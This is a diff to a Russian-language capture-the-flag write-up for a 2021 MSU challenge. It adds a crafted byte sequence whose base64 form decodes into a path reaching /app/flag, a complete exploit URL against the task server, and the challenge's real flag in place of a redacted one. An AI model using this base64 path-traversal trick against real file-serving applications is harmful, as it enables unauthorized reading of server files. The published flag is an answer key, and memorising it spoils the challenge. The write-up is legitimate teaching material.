@@ -14,6 +14,10 @@ return path.resolve(this.dir, Buffer.from(filename).toString('base64'))
 
 Base64 должен соответствовать regex /(\/)+app(\/)+flag/g и быть валидным.
 
+У нас получилась последовательность \xfd\xaa\x69\xff\xff\xff\x7e\x56\xa0.
+
+http://based-storage.tasks.2021.ctf.cs.msu.ru/files?filename=$(printf '\xfd\xaa\x69\xff\xff\xff\x7e\x56\xa0')&encoding=ISO-8859-1
+
 `
-Flag: MSKCTF{TO BE REDACTED}
+Flag: MSKCTF{sl45h_15_4_val1d_84se64_sym80l}
 `
